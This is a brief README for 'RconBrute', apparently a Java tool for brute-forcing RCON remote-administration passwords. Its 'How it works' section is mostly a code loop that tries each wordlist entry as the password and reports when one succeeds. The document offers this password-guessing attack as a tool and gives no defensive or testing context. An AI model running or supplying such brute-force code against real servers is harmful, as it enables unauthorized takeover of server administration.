# 🔌 RconBrute
Java Rcon BruteForce

# ⚡ How it works?
```java
while(wordlist.hasNextLine()) {
    String line = wordlist.nextLine();
    try {
        Rcon rcon = new Rcon(ip, port, line.getBytes());
        System.out.println("[+] Password Found: " + line);
        break;
    } catch (AuthenticationException | IOException e) {
        System.out.println("[-] Password Incorrect: " + line);
    }
}
```
